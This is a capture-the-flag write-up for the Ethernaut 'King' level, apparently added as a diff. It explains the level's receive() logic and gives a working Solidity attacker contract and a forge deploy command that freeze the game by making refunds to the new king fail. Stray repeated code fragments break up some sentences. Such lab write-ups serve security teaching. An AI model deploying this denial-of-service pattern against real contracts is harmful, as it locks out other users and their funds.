@@ -1,0 +1,58 @@
+"This is a simple game in which whoever sends an amount of ether that is larger than the current prize becomes the new king. In such an event, the overthrown king gets paid the new prize. 
+Your goal is to break the game. When you submit this instance, the level is going to try and reclaim the kingship. If you could prevent this from happening and stay the king, you win. Let's see how we can compromise the logic. 
+receive() external payable {
+    require(msg.value >= prize || msg.sender == owner); // check if sufficient ether is being sent
+    king.transfer(msg.value); // transfer the Ether to previous king
+    king = msg.sender; // make us the new king
+    prize = msg.value; // set the new prize to the value which we sent
+}
+
+The magic is happening inside the receive() function. Let's take a look. 
+receive()
+The only requirement is that if a user sends Ether to the contract, the value should be more than the prize. We can check the prize using await contract.prize(). It comes out to be 1000000000000000 wei or 0.001 Ether.
+await contract.prize()
+1000000000000000 wei
+0.001 Ether
+This means that to get over the require condition, we need to send at least 0.001 Ether or be the contract owner. 
+require
+0.001 Ether
+Once we deposit the amount, the function transfers the sent amount to the previous king of the contract and makes us the new king, and updates the prize value to the amount of Ether that we sent. 
+To exploit the process, we need to make sure that once we become the new king, other users can not do so and that their call to the receive() function should fail. 
+The only area where this is possible is through the transfer function since we can control the address of the contract to which the funds will be sent. 
+receive()
+To prevent a new user from becoming the king: 
+1000000000000000 wei
+fallback()
+receive()
+We will deploy a contract to the Rinkeby network. Here's the code:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""../instances/Ilevel09.sol"";
+
+contract Newking{
+    King level9 = King(0xD62Ebd3eD82D885bFF312C3F06762f1B38373341);
+    constructor() public payable{
+        address(level9).call{value: level9.prize()}(""""); // triggering the receive() function on King contract with the msg.value as prize
+    }
+}
+
+There's a constructor defined in our contract which is payable. This will allow us to send some Ether while deploying the contract. The constructor will automatically trigger the receive() function of the King contract. The msg.value is set to prize which we are dynamically fetching from their contract. 
+receive()
+msg.value
+prize
+Since there's no receive() or fallback() function implemented in our contract, no one can send it Ether using a normal transfer() call. There are obviously other ways that are discussed in my Level 07's writeup.
+receive()
+fallback()
+transfer()
+We could have also implemented a receive() or fallback() function and added a revert statement inside of it to achieve the same results but why the extra effort? 
+receive()
+fallback()
+revert
+Let's deploy the contract using the following command: 
+forge create Newking --private-key $PKEY --rpc-url $RPC_URL --value 1000000000000000wei
+
+
+The instance can now be submitted to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+External calls should be used with caution and proper error handling should be implemented on all external calls. "
